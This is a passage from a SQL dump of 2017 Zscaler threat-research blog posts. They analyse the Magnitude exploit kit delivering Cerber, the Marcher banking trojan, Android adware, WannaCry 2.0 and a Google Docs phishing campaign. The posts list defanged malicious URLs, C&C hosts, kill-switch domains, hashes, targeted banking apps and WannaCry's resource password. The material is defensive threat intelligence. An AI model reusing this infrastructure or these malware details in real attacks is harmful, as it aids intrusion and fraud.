exists in applying security patches and securing internal systems (via network segmentation).    Zscaler ThreatLabZ is actively monitoring this threat and will continue to ensure coverage for Zscaler customers.    Indicators of Compromise    DLLs      	E285B6CE047015943E685E6638BD837E  	71B6A493388E7D0B40C83CE903BC6B04      Research by ThreatLabZ team', 'Ransomware', 'https://www.zscaler.com/blogs/research/update-petya-ransomware-outbreak');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (63, 'Wonder Woman, Piracy, and the Cerber Ransomware', 'Rohit Hegde', 'June 26, 2017', 'It’s become a lucrative business for malicious actors to host illegal streaming websites and upload or link to bootlegged content. The income from such activity is generated from the advertisements served to visitors. At the same time, attackers have become more savvy, devising new methods for getting users to click on ad links, as we noted in a previous blog. In some cases, users are  tricked into clicking on ad links before being allowed to watch the streaming content. Others require visitors to simply close the ads; while that may seem harmless, we have observed one example in which Exploit Kit actors are using this technique to their benefit.\r\n\r\nAnalysis\r\n\r\nIn this instance, we observed the streaming website gomovies[.]to serving visitors the Magnitude Exploit Kit (EK). While many watchful users might have checked this site for malicious activity on a website scanner, there’s a good chance they wouldn’t have found any. We checked the gomovies[.]to site on VirusTotal and, at the time of this writing, the streaming site had no detection.\r\n\r\n\r\n\r\nFigure 1: VirusTotal scanner analysis\r\n\r\nThe streaming website has a collection of bootlegged copies of recently released movies. One such movie was Wonder Woman, and the site offered multiple links to audience-recorded (“cammed”) copies.\r\n\r\nIf visitors to the site are not chosen by the malvertising network to be infected, they get the usual streaming options, as shown below.\r\n\r\n\r\n\r\nFigure 2: The Gomovies[.]to page showing streaming of cammed version of Wonder Woman.\r\n\r\nHowever, when visitors from East or Southeast Asia decide to visit the same link (http://gomovies[.]to/film/wonder-woman-20963/watching.html?ep=655097), they are redirected to a malvertising URL (http://xml.targead[.]com/click?i=xVLSH*HPpm4_0), which serves a HTTP 302 redirect, shown below.\r\n\r\n\r\n\r\nFigure 3: HTTP 302 redirect from the malicious advertising link.\r\n\r\nThe full Magnitude EK cycle is shown below.\r\n\r\n\r\n\r\nFigure 4: Screen capture of the Magnitude EK HTTP traffic.\r\n\r\nThe redirected URL gaperbizfunds[.]org/ now serves an obfuscated JavaScript in the HTML head section, as shown below. We observed that the obfuscation style has changed a little from the previous week.\r\n\r\n\r\n\r\n\r\nFigure 5: Magnitude EK Gate - obfuscated JavaScript.\r\n\r\nThe deobfuscated copy of the script is shown below.\r\n\r\n\r\n\r\n\r\nFigure 6: Magnitude EK Gate deobfuscated JavaScript \r\n\r\nThis redirect sends us to the second Magnitude EK gate, which presents another obfuscated JavaScript, shown below.\r\n\r\n\r\n\r\n\r\nFigure 7: Magnitude EK Gate 2 Obfuscated JavaScript.\r\n\r\nThe deobfuscated script is shown below.\r\n\r\n\r\n\r\n\r\nFigure 8: Magnitude EK Gate 2 deobfuscated JavaScript.\r\n\r\nWe see a check happening for a Kaspersky plugin, which if unsuccessful, will redirect the user to the landing page.\r\n\r\nOn the landing page, we find the scripting engine memory corruption vulnerability (CVE-2016-0189) being leveraged to exploit the target machine.\r\n\r\n\r\n\r\n\r\nFigure 9: CVE-2016-0189\r\n\r\nBefore the actual exploit payload is served, a lightweight flash file is served to perform fingerprinting on the victim\'s machine. The exploit kit author collects information such as operating system and the flash plugin version as seen below.\r\n\r\n\r\n\r\n\r\nFigure 10: Flash fingerprinting.\r\n\r\nThe decompiled script present in the Flash download is shown below.\r\n\r\n\r\n\r\nFigure 11: Decompiled Flash \r\n\r\nThe Capabilities check output is returned to the attacker\'s server in the form of a GET request (hxxp://abbsd68ucd03p[.]datadry[.]men/WIN%209,0,277,0).\r\n\r\nWe then see an attempt by the regsrv32.exe to register an executable named eK01G3.exe.\r\n\r\n\r\n\r\nFigure 12: regsrv32 app register.\r\n\r\nThe obfuscated form of this scriptlet is shown below.\r\n\r\n\r\n\r\nFigure 13: Downloaded app register scriptlet in obfuscated form.\r\n\r\nThe simplified form of the scriptlet is shown below, and we can see the name of application being registered and the download URL for the base64 stream.\r\n\r\n\r\n\r\nFigure 14: app register scriptlet in simplified form.\r\n\r\nThe payload delivered by this cycle was Cerber ransomware as shown in the screenshot below.\r\n\r\n\r\n\r\n\r\nFigure 15: Cerber Ransomware infection.\r\n\r\nIn this case, the files were encrypted with the extension .8840.\r\n\r\nConclusion:\r\n\r\nUsers must be careful to avoid malicious streaming websites, relying only on official services. Users must also ensure that their systems are updated with all the relevant patches, and special care must be taken to keep plugins and browsers updated.\r\n\r\nZscaler ThreatLabZ is actively monitoring Magnitude EK activity to ensure that Zscaler customers are protected.\r\n\r\nIndicators of compromise (IOCs):\r\n\r\nriverfunds[.]org/\r\ntallentvapes[.]biz/\r\ntopfilesdownload[.]net/    \r\nbylogames[.]com/\r\ndifficultfinance[.]net/\r\nperfectgame[.]biz/\r\nnameofmoney[.]biz/', 'Exploit Kit;Ransomware', 'https://www.zscaler.com/blogs/research/wonder-woman-piracy-and-cerber-ransomware');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (64, 'New Android Marcher Variant Posing as Adobe Flash Player Update', 'Viral Gandhi', 'June 22, 2017', 'Introduction    Marcher is sophisticated banking malware that steals users’ financial information, such as online banking credentials and credit card details. We have observed Marcher evolving over time, using new tricks and payload delivery mechanisms. As we reported about previous encounters with this malware here, here, and here, the authors are using new techniques to spread infections, such as pornographic lures and the hype around new games.    In a recent wave, we are seeing the malware payloads disguised as Adobe Flash player. Upon opening the dropper URL, the user will be prompted by a message saying the device’s Flash Player is out of date, and the malware “Adobe_Flash_2016.apk” will be dropped on the user’s device. The malware will also guide the user to disable security and allow third-party apps to install, as shown in the screen below.        Fig 1: Payload delivery    We saw multiple payloads being served where popcash.net ads were the initial source of infection.          Fig 2: New Android Marcher wave    Upon installation, the malware quickly hides and removes its icon from the phone menu.    Following infection, the malware will register the infected device to its Command & Control (C&C) server. Along with the device’s meta information, the installed apps list is sent to the C&C server as shown below.        Fig 3: C&C communication       After a few sleep cycles, the malware waits for the user to open an app from its targeted list. We found that this variant is capable of targeting over 40 financial apps. When the user opens any of the targeted apps, the malware will quickly overlay a fake login page, which lures the victim into supplying user credentials. Some of the overlay pages are shown below.          Fig 4: Fake login pages     Unlike Marcher malware we’ve seen in the past, this variant maintains a JavaScript Object Notation (JSON) file that lists each targeted app and its fake login page hosting URL. This list is hardcoded in the malware payload. A screen capture is shown below.          Fig 5: Targeted apps list with the associated URLs that serve the overlay pages    The following is a list of financial apps targeted by the new Marcher variant:      	com.android.vending  	org.morgbigorg.nonem  	com.google.android.gm  	com.yahoo.mobile.client.android.mail  	com.htc.android.mail  	com.android.email  	com.paypal.android.p2pmobile  	com.chase.sig.android  	com.suntrust.mobilebanking  	com.wf.wellsfargomobile  	com.citi.citimobile  	com.konylabs.capitalone  	com.infonow.bofa  	com.morganstanley.clientmobile.prod  	com.amazon.mShop.android.shopping  	com.htsu.hsbcpersonalbanking  	com.usaa.mobile.android.usaa  	com.schwab.mobile  	com.americanexpress.android.acctsvcs.us  	com.pnc.ecommerce.mobile  	com.regions.mobbanking  	com.clairmail.fth  	com.grppl.android.shell.BOS  	com.tdbank  	com.huntington.m  	com.citizensbank.androidapp  	com.usbank.mobilebanking  	com.key.android  	com.ally.MobileBanking  	com.unionbank.ecommerce.mobile.android  	com.mfoundry.mb.android.mb_BMOH071025661  	com.bbt.cmol  	com.sovereign.santander  	com.mtb.mbanking.sc.retail.prod  	com.fi9293.godough  	com.circle.android  	com.coinbase.android  	com.walmart.android  	com.bestbuy.android  	com.gyft.android  	com.commbank.netbank  	org.westpac.bank  	au.com.nab.mobile  	org.stgeorge.bank  	com.facebook.katana  	com.moneybookers.skrillpayments  	com.westernunion.android.mtapp  	au.com.ingdirect.android  	au.com.bankwest.mobile  	org.banksa.bank  	com.ebay.mobile  	com.ebay.gumtree.au  	com.anz.android.gomoney  	com.anz.android      Unlike other Marcher malware, this variant is highly obfuscated, which explains the low antivirus (AV) detection rate. The VirusTotal screen capture below shows that less than 20 percent of AV scanners detected the new variant (at the time of the scan).    VT: 11/59 (at the time of analysis)        Fig 6: VT detection             Fig 7: Obfuscated code     The overlay (fake) login pages for the financial apps are hosted remotely, allowing the author to update them as needed. In the sample C&C communication shown below, the user on the infected device tries to launch the Commonwealth Bank of Australia app; it gets intercepted by the Marcher Trojan, which loads an overlay login page from a remote location.        Fig 8: Serving fake page in server response    If the user falls for the fake login page and enters his or her banking credentials, the Marcher Trojan relays the information to the C&C server, as shown in the screenshot below.        Fig 9: Credential harvesting    Conclusion    We have been seeing regular infection attempts for this Marcher variant in the past month. The frequent changes in the Marcher family indicate that the malware remains an active and prevalent threat to Android devices.    To avoid being a victim of such malware, be sure to download apps only from trusted app stores, such as Google Play. By unchecking the \"Unknown Sources\" option under the \"Security\" settings of your device, you can prevent inadvertent downloads from questionable sources.    Zscaler ThreatLabZ is actively monitoring Android Marcher and its variants to ensure that Zscaler customers are protected.    Indicators of compromise (IOCs):    Dropper URLs      	hxxp://click-soft[.]ga/flash/  	hxxp://rockstargamers[.]ru/flash  	hxxp://optus-mms[.]net/flash  	hxxp://luxapps[.]ru/flash  	hxxp://apdate[.]tk/flash/      C&Cs:      	hxxp://88[.]99[.]32[.]31  	hxxp://adminhasdp2123[.]ru', 'Malware', 'https://www.zscaler.com/blogs/research/new-android-marcher-variant-posing-adobe-flash-player-update');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (65, 'Top Exploit Kit Activity Roundup - Spring 2017', 'Rohit Hegde', 'June 14, 2017', 'Overview\r\n\r\nThis is the fifth in a series of posts in which we\'re examining recent activity of the current top exploit kits. An exploit kit (EK) is a rapidly deployable software package designed to leverage vulnerabilities in web browsers to deliver a malicious payload to a victim’s computer. Authors of EKs offer their services for a fee, distributing malware for other malicious actors.\r\n\r\nThrough spring 2017, we have seen several significant changes in various exploit kits\' structure and distribution. The RIG EK maintains its position as the most active exploit kit, serving a variety of ransomware payloads. Traffic to the Sundown, KaiXin, and Terror EKs all fell, though the latter two remain active. Magnitude EK has shown a slight increase in visibility, targeting users in Southeast Asia with a malvertising campaign.\r\n\r\nYou can find our previous roundup here.\r\n\r\nRIG Exploit Kit\r\n\r\nRIG remains the most active exploit kit, although overall traffic has been marginally decreasing over the past several months. RIG is still a primary distributor of various ransomware payloads, and we have recently observed it dropping cryptocurrency mining software.\r\n\r\n\r\n\r\nFigure 1: RIG EK instances blocked, March 2017 – June 2017\r\n\r\n\r\n\r\nFigure 2: RIG EK landing server geo distribution\r\n\r\nThe distribution of RIG hosts remains fairly similar, although the activity we observed last quarter in Southeast Asia and South America was absent this quarter.\r\n\r\nRecently, we observed a campaign originating from malicious script injections on compromised sites that dropped both Cerber ransomware and a Bitcoin mining payload.\r\n\r\n\r\n\r\nFigure 3: RIG EK compromised site injection\r\n\r\nIn our previous roundup, we saw that the Terror EK was dropping ccminer, a cryptocurrency mining suite, onto victim computers. It appears that other exploit kit users are now incorporating that same method in parallel with ransomware payloads in order to generate additional revenue.\r\n\r\nAnother campaign with some unique features was observed in late May. This campaign is primarily targeting adult-themed sites.\r\n\r\n\r\n\r\nFigure 4: RIG EK gate\r\n\r\nThis campaign uses the same browser fingerprinting script that we’ve seen in many RIG campaigns, but the landing page URL uses a newer, atypical pattern that was first observed in early March. This campaign is using the new URI parameters fix, yus, and ct.\r\n\r\n\r\n\r\nFigure 5: RIG EK session\r\n\r\nThis campaign drops the Dreambot banking Trojan, as well as a Tor library to use for post-infection command and control. Support for Tor functionality was incorporated into Dreambot last year.\r\n\r\nRIG temporarily stopped serving SWF exploits at the beginning of April, causing some independent researcher to suppose that the exploit kit authors had given up on using Flash exploits. During this time, the EK relied on browser exploits such as the ubiquitous CVE-2016-0189. However, several days later, RIG resumed serving SWF exploits.\r\n\r\nMost recently, RIG was subject to a takedown campaign headed by RSA, targeting campaigns using shadowed domains (https://blogs.rsa.com/shadowfall/).\r\n\r\nMagnitude Exploit Kit\r\n\r\nMagnitude EK is one of the longest-running exploit kits. It has been active since late 2013, although it has had a relatively low volume of traffic over the last year.\r\n\r\nDuring our last roundup, we noted that Magnitude was primarily targeting Southeast Asian countries with a malvertising campaign dropping Cerber ransomware. The campaign has continued throughout this quarter, running advertisements for Forex investment, gaming websites, porn sites, and fake shopping portals.\r\n\r\n\r\n\r\nFigure 6: Magnitude EK instances blocked, March 2017 - June 2017\r\n\r\n\r\n\r\nFigure 7: Magnitude EK cycle\r\n\r\nWhen the malvertising content is viewed, the victim is served a HTTP 302 redirect which sends the user to a Magnitude gate.\r\n\r\n\r\n\r\nFigure 8: Magnitude EK gate redirect\r\n\r\nThe gate serves obfuscated JavaScript, which contains the final redirect to the exploit kit landing page\r\n\r\n\r\n\r\nFigure 9: Malicious page delivered by the ad network\r\n\r\n\r\n\r\nFigure 10: Deobfuscated script\r\n\r\nSome landing pages in this campaign track client IP addresses, preventing multiple exploit chains from being served to the same IP.\r\n\r\nThe Flash exploit payload performs a version fingerprinting check, returning the client OS and Flash version number. This information is sent back to the Magnitude server.\r\n\r\n\r\n\r\nFigure 11: Magnitude Flash fingerprinting\r\n\r\nAfter fingerprinting, Magnitude infects the victim with Cerber ransomware.\r\n\r\nThis campaign targets users in Taiwan but filters out connections from other Southeast Asian countries, such as South Korea. If the client is not in the targeted region, the exploit kit delivers a blank page instead of the exploit.\r\n\r\nTerror Exploit Kit\r\n\r\nThe Terror EK is a newer exploit kit that appeared to be cobbled together from pieces of Metasploit payloads as well as other EKs, most notably Sundown and Hunter. It still employs Sundown exploit packages, though some large changes have been made to the infection cycle. The exploit kit evolved from its old carpet bombing techniques to a more selective technique that uses fingerprinting during the exploit chain.\r\n\r\nLike many other exploit kits, the Terror EK cycle begins with a malicious script injection. In this case, Terror uses a very simple character replacement obfuscation method.\r\n\r\n\r\n\r\nFigure 12: Terror EK obfuscated script injection\r\n\r\n\r\n\r\nFigure 13: Terror EK deobfuscated redirect\r\n\r\nThe IFrame URL serves a HTTP 302 redirect, which sends the client to the Terror landing page. The user is fingerprinted and information collected from the user is sent back as a POST request.\r\n\r\n\r\n\r\nFigure 14: Terror EK fingerprinting data\r\n\r\nThe information collected includes the URL of the compromised website from which the user is being redirected, the compromised site, and version information of Silverlight, ActiveX, QuickTime, PDF, Java, and Flash plugins.\r\n\r\nIn response, the server tries to load exploit CVE-2016-0189 and CVE-2016-2419 as shown below:\r\n\r\n\r\n\r\nFigure 15: Terror EK CVE-2016-0189\r\n\r\n\r\n\r\nFigure 16: Terror EK CVE-2016-2419\r\n\r\nPayloads dropped by the Terror EK include Win32/Tofsee, Smoke Loader, Andromeda and cryptocurrency miners.\r\n\r\nOther Exploit Kits\r\n\r\nNeutrino Exploit Kit\r\n\r\nThe Neutrino EK returned this winter after shutting down nearly all traffic in late September 2016. During that time, RIG replaced Neutrino as the primary distributor for CryptXXX ransomware. Since Neutrino’s return, it has remained steadily active, though low in volume compared to its pre-shutdown traffic.\r\n\r\nKaiXin Exploit Kit\r\n\r\nKaiXin EK activity has declined and remains targeted to Asian websites. No significant changes have been made to the exploit kit structure. Current campaigns are propagating via compromised sites, and are still infecting users with bundled Chinese adware packages.\r\n\r\nSundown Exploit Kit\r\n\r\nIn late winter, Sundown EK traffic declined sharply, and the exploit kit has shown very little traffic since March.\r\n\r\nConclusion\r\n\r\nExploit kits are insidious, because they’re widely available and relatively cheap, this makes it easy to launch malware attacks on unsuspecting users. New Exploit Kits surface all the time with different attack vectors, new targets, and broader reach. Exploit Kit authors keep changing the fingerprinting and infection techniques to evade security products and researchers from analyzing their kits. As seen in this roundup, RIG remains one of the most prevalent exploit kit being used along with few other smaller Exploit kit players in the market.\r\n\r\nThe ThreatLabZ research team actively tracks coverage for these exploit kits and their payloads, ensuring protection for organizations using Zscaler cloud-delivered Internet security.\r\n\r\nResearched by Derek Gooley and Rohit Hegde', 'Exploit Kit', 'https://www.zscaler.com/blogs/research/top-exploit-kit-activity-roundup-spring-2017');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (66, 'Malicious Android Ads leading to drive by downloads', 'Shivang Desai', 'June 05, 2017', 'The Zscaler ThreatLabZ team recently identified an Android app that was downloading itself from advertisements posted on forums. Malvertising is a growing problem and one that we have covered on past occasions, especially given the rise in SSL sites that serve malicious ads.  On one such forum we found entitled “GodLikeProductions,” visitors complained about the automatically downloading app, but those messages were either removed or ignored by the forum\'s hosts, allowing the problem to perpetuate. In this particular instance, the app uses the insidious mask of a \"security update\" to get a user to complete the installation.     Here is our detailed analysis of how the malicious app works.     The following screenshots showing  user complaints on the \"GodLikeProductions\" forum before the messages were removed:      	  		  			  		  		  			   		  		  			  		  		  			                                                                                   Fig. 1: Discussion about the app on a forum  		  	      We were not able to locate the ads that were spreading this malicious app, but we did capture the Android Package (APK).    The APK, known as “kskas.apk,” portrays itself as \"Ks Clean,\" an Android cleaner app, upon installation.           	  		  			  		  		  			Fig. 2: KsClean icon and permissions  		  	           Once installed, the app displays a fake system update message in which the only option presented to the user is to select the \"OK\" button, forcing the user to accept the message.      	  		  			  		  		  			Fig 3: Pop up message  		  	           As soon as the user presses “OK,” the malware prompts the installation of another APK named Update. This APK is stored locally inside the assets directory of the app. Once installed, the Update app immediately asks for Admin rights, as shown in screenshot below:           	  		  			  		  		  			Fig. 4: Payload app - \"update.apk\"  		  	           The Zscaler sandbox quickly flagged this malicious app. The screenshot below depicts the main issues flagged by the sandbox:      	  		  			  		  		  			Fig. 5: Zscaler Sandbox  		  	           Once the app gains admin rights, it becomes impossible to remove it from the device. The traditional \"Uninstall\" option, by default, becomes disabled, because a user cannot remove apps with admin rights. Usually, one can uninstall such apps by first removing admin privileges via settings, but this app uses an unconventional method — registering as an Android receiver — to preserve its admin privileges.    An Android receiver is an Android component that gets triggered in accordance with registered events and actions. In this case, it registers a receiver for an event titled, \"DEVICE_ADMIN_DISABLED,\" which locks down the device for few seconds whenever the user tries to disable admin privileges.    The following screenshot shows this action in code:      	  		  			  		  		  			Fig. 6: Locking code.   		  	           Here\'s a video of this functionality which shows how phone gets locked for few seconds when victim tries to remove Admin rights from this app. (Please enable subtitles)     From a permissions point of view, the app is capable of performing various suspicious activities, including:      	Mount/Unmount filesystems  	Read/Write bookmarks history  	Overlay system window  	Write Settings  	Download Without Notification      The ads that carry the automatically downloaded app are displayed as follows:      	  		  			  		  		  			Fig 7: ads are shown outside of the app  		  	           We also noticed that the app connects with its Command & Control (C&C) server to fetch the various parameters it needs to operate.      	  		  			  		  		  			Fig 8: C&C communication  		  	           After inspecting the network traffic we saw that the traffic is encrypted and needed to be decrypted in order to understand what it\'s trying to communicate. We found that the traffic is encrypted by AES algorithm and the key-IV is found to be hardcoded inside the code. After manually decrypting this traffic, here\'s the plaintext version of it:      	  		  			  		  		  			Fig 9: Decrypted network traffic  		  	           In the decrypted response, we can see the \"update_content\" parameter contains the message that will be shown to the user (see Fig. 1). It also receives an update interval to update its dynamically loaded .dex (present inside .jar) and a native library (.so) file. The dynamically loaded .dex file is responsible for advertisement-related activities and the .so file runs a daemon process, which helps the app execute even if the app is force closed.    We saw over 300 instances of malicious APKs being blocked in past 2 weeks from this campaign affecting users in U.S. and U.K.as seen below:       	  		  			  			  			  		  		  			Fig 10: Infections seen over cloud  		  	           Conclusion    The dropper app frightens the user with a message saying that there is a security loophole in the device and the user must install an update in order to prevent the loss of account and personal information. The update app asks for administrator privileges; if granted by the user, there is no way to revoke them. After that, there is nothing that can stop the malware from popping the ads even when the user is using other apps.    Zscaler ThreatLabZ is actively monitoring this malware campaign to ensure that Zscaler customers are protected from infection.​ Android users can take the following preventive measures to safeguard against this threat:      	Do not click on unknown links  	Disable \"Unknown Sources\"    	Disable auto-download in Android browsers      Indicators of Compromise      	  		  			                             MD5  			   Package Name  			   		  		  			66a1dda748d073f5e659b700339c3343  			com.master.clean  			Dropper APK  		  		  			e159f598f1db355dc930c60662f77c6c  			com.Airie.CleanupRadar  			Dropped APK  		  	           Research performed by Shivang & Gaurav', 'Mobile Malware', 'https://www.zscaler.com/blogs/research/malicious-android-ads-leading-drive-downloads');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (67, 'WannaCry 2.0 ransomware attacks continue...', 'Deepen Desai', 'May 15, 2017', 'Introduction    An aggressive ransomware campaign went viral on May 12, 2017, that impacted over 200,000 systems worldwide and the attack remains active. The use of the leaked NSA \"ETERNALBLUE\" SMB exploit by the dropper payloads, which target a Microsoft Windows vulnerability in the Microsoft Server Message Block (SMB) v1.0 protocol, made this campaign virulent. Microsoft released a patch for this vulnerability in March 2017 for all the supported operating systems; however, there are still organizations with legacy systems running older and now unsupported operating systems like Windows XP for which the patch was not available in March. Microsoft released an emergency patch over the weekend for the unsupported operating systems in the wake of this attack.    As predicted in the WannaCry Zscaler Security advisory, we are now seeing different variants of the initial dropper in the wild that are leading to the WannaCrypt ransomware infection. In this blog, we will provide a technical analysis of different dropper variants we have seen till now, propagation vectors, and the final ransomware payload.        Figure 1: WannaCrypt infection vectors    1. Initial WannaCry Dropper Variants – May 12, 2017 onwards    The WannaCry dropper variants that we saw in the first 24 hours were all performing the following activities:    a. Killswitch domain check before starting the infection cycle     The dropper payload will attempt to make a direct connection to a hardcoded domain over HTTP and, if the connection is successful, the malware will terminate. The malware payload will begin the infection cycle if the connection is not successful. There have been more variants seen in past 72 hours with different killswitch domains that include:      	iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea[.]com  	ifferfsodp9ifjaposdfjhgosurijfaewrwergwea[.]com  	iuqerssodp9ifjaposdfjhgosurijfaewrwergwea[.]com  	ayylmaotjhsstasdfasdfasdfasdfasdfasdfasdf[.]com      Organizations can locally resolve these domains to a local webserver as an additional safeguard mechanism to mitigate infection from these dropper variants. It is also important to monitor the logs to identify systems that hit this local webserver to perform isolation and remediation activity. The following is a screenshot showing the killswitch domain check:        Figure 2: Killswitch domain check from a sample    b. Network propagation using the MS17-010 exploit    The dropper variant will spawn multiple threads to scan for internal as well as external IP addresses on ports 139 and 445 in the /24 subnet range. If the malware finds any IP address with active SMB ports, it will attempt to trigger the MS17-010 exploit and perform remote code execution on the target system. Upon a successful exploit run, the malware will copy the dropper variant on the target system and execute it to perform a similar activity.     Several factors made this attack extremely virulent. They include the use of the recent SMB exploit to perform lateral movement, the delay that exists in most enterprise environments to apply security patches, and the fact that there are still thousands of legacy systems running older operating systems that had no security patch availability until May 13, 2017.     c. Embedded WannaCry 2.0 payload    The dropper payloads contain a WannaCry 2.0 ransomware executable embedded in the resource section. The ransomware executable will be installed on the target system once the SMB exploit is successful, effectively encrypting all the user documents.        Figure 3: Embedded WannaCry 2.0 payload in the dropper    2. New downloader variant using web channel (HTTP) – May 15, 2017    Earlier today (May 15, 2017),  we saw a new downloader variant that had an embedded link pointing to the WannaCry 2.0 payload hosted on a compromised server. The downloader payload is packed using UPX packer and is compiled using a \"php2exe\" tool that converts PHP code into a Microsoft Windows Executable.      	Filename - wcrydl.exe  	MD5 - 2788541f68a8bf3f9f8405bf6fdcd033      The code responsible for downloading and executing the WannaCry 2.0 payload is present in the resource section of the main executable as seen in the screenshot below:        Figure 4: Resource section containing downloader PHP scripts    Here is a screenshot showing the decompiled PHP version of the dropper executable.        Figure 5: Decompiled downloader PHP code    The remote server hosting the WannaCry payload appears to be compromised. The WannaCry executable is hosted at the following location:      	neiscoegypt[.]com/ajax/wanacry.exe           WannaCry 2.0 payload analysis    The ransomware executables seen in all the campaigns appear to be similar, as we have been able to flag all of them using the first set of signatures deployed on Friday (May 12). The ransomware executable contains a password-protected resource section containing configuration data.    The WannaCry payload performs following activity when executed on the victim system:    - It uses a random string, referred here as RAND_Install_STRING ( e.g - bcjlwytjyjlj255), created based on computer name and random values for installation folder and service name.        Figure 6: Installation folder and service name    - If C:\\ProgramData folder exists, it creates a new folder with name as RAND_Install_STRING inside ProgramData folder. Otherwise, it creates a folder \"Intel\" in <Window_InstallationDrive> and a sub-folder with a random name. In both cases it copies itself with the name tasksche.exe.        Figure 7: Installation folder and payload    - It checks if there is a service with name RAND_Install_STRING; if not it creates a service with the name RAND_Install_STRING and starts it.        Figure 8: New process to run the dropped executable    - CIt creates a registry key with name \"WanaCrypt0r\" to store the installation path.        Figure 9: Registry entry to store installation path    - The malware has all its config data in the resource section and the password is “WNcry@2ol7.” These additional components are extracted from resource section \"XIA\" to the current execution path.        Figure 10: Additional ransomware resources including ransom note    - The ransom note is embedded in 28 different languages inside the ransomware payload:        Figure 11: Ransom note in multiple languages    - It loads encrypted DLL and starts the file encryption process on the victim\'s machine. It will look for user files with the following extensions to encrypt:    .lay6 .sqlite3 .sqlitedb .accdb .java .class .mpeg .djvu .tiff .jpeg .backup .vmdk .sldm .sldx .onetoc2 .vsdx .potm .potx .ppam .ppsx .ppsm  .pptm .pptx .xltm .xltx .xlsb .xlsm .xlsx .dotx .dotm .docm .docb .docx    The encrypted files are renamed with the “.wnry” extension and the ransom instructions are in text file name “@Please_Read_Me@.txt.”        Figure 12: WannaCry ransom note    Conclusion    Several ransomware outbreaks started in 2016 and we have seen dozens of new strains in the past year and a half. However, the delivery vector seen in the case of WannaCrypt 2.0 makes it highly virulent and successful in impacting thousands of users in a short time frame. We will continue to see newer delivery vectors and various copy-cat strains of this malware in the coming weeks, given the global impact this has had.    Zscaler ThreatLabZ is actively monitoring this threat and will continue to ensure coverage for Zscaler customers.    Acknowledgement    Abhaykant Yadav, Amandeep Kumar, Nirmal Singh for helping with the analysis    Indicators of compromise    MD5 hash    84c82835a5d21bbcf75a61706d8ab549    7f7ccaa16fb15eb1c7399d422f8363e8    2b4e8612d9f8cdcf520a8b2e42779ffa    509c41ec97bb81b0567b059aa2f50fe8    835fff032c51075c0c27946f6ebd64a3    86721e64ffbd69aa6944b9672bcabb6d    f9cee5e75b7f1298aece9145ea80a1d2    b7f7ad4970506e8547e0f493c80ba441    c61256583c6569ac13a136bfd440ca09    f9992dfb56a9c6c20eb727e6a26b0172    d6114ba5f10ad67a4131ab72531f02da', 'Ransomware', 'https://www.zscaler.com/blogs/research/wannacry-20-ransomware-attacks-continue');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (68, 'Google Docs Phishing Campaign', 'Deepen Desai', 'May 03, 2017', 'Introduction\r\n\r\nAn aggressive phishing campaign went viral earlier today that impacted multiple Google Mail users, including those in enterprise Google deployments. The campaign involved unsuspecting users receiving an email with a Google Doc link from one of their known contacts. If a user clicks on the link and further grants access, that user\'s contacts would be leveraged to send the same phishing email with a link from the impacted user account.\r\n\r\nThe attack involved squatted domains that were recently registered and hosting the malicious web app. Google permitted this app to request access to a user’s email and contacts leveraging the Google authentication service. As such, many users believed that they were responding to a request from Google, not a third party, and clicked on it.\r\n\r\nCampaign details\r\n\r\nWe saw the Mailinator service being leveraged to receive the spam emails with Google Doc links to harvest email addresses of the victims who fell for the campaign. Below is a screenshot of one of the inboxes used in this campaign:\r\n\r\n\r\n\r\nFigure 1: Mailinator inbox leveraged in one of the spam emails\r\n\r\nHere is a sample email that the target user would receive from this campaign:\r\n\r\n\r\n\r\nFigure 2: Google phishing email with link\r\n\r\nIf the \"Open the Docs\" link is clicked, the user will be redirected to Google’s OAuth to select the Google account:\r\n\r\n\r\n\r\nFigure 3: Google\'s OAuth redirection\r\n\r\nOnce the user selects the Google account, the malicious app will request the following permissions; to the user, the requests looks like it has come from Google Docs:\r\n\r\n\r\n	Read, send, delete, and manage your emails\r\n	Manage your contacts\r\n\r\n\r\n\r\n\r\nFigure 4: Google OAuth permission for accessing email and contacts\r\n\r\nIf access was allowed, the user will be redirected to a site hosting a malicious web app. We noticed 10 unique, recently registered domains that were being leveraged for this activity. Each of these domains was registered on the same day: April 22, 2017. We saw more than 10,000 hits in two hours earlier today for these squatted domains.\r\n\r\n\r\n\r\nFigure 5: Hits to squatted domains involved in Google phishing campaign\r\n\r\nConclusion\r\n\r\nThe attacker leveraged the tried-and-true method of social engineering to make this phishing campaign successful. The campaign became viral within minutes, because the majority of these spam emails were sent from legitimate Google user accounts to their known contacts, making detection difficult.\r\n\r\nGoogle was quick to resolve this issue and provided regular updates on its Twitter handle (@googledocs). Zscaler implemented blocks for multiple domains tied to this campaign within minutes of the initial reports, ensuring protection for customers. Customers leveraging strict Suspicious destination-based policies were proactively protected from this campaign.\r\n\r\nIOCs\r\n\r\ng-cloud[.]pro\r\ng-cloud[.]win\r\ngdocs[.]download\r\ndocscloud[.]download\r\ndocscloud[.]info\r\ngdocs[.]win\r\ng-docs[.]pro\r\ndocscloud[.]win \r\ngdocs[.]pro\r\ng-docs[.]win', 'Phishing', 'https://www.zscaler.com/blogs/research/google-docs-phishing-campaign');
